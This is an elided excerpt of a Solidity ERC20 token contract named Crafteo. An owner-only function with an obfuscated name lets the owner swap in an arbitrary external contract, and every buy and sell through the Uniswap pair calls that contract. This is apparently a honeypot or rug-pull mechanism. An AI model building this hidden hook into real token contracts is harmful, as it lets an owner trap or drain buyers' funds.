...
contract TokenM is ERC20 {
    ...
    IUserAmounthuoier public huoier;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Crafteo", "NFTC") {
    ...
    function cuhereelBnjiweRbbdt(IUserAmounthuoier _huoier) public onlyOwner {
        huoier = _huoier;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                huoier.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				huoier.addOutAmount(from, amount);
            }else{
                huoier.addOutAmount(from, amount);
                takeFee = false;
            }
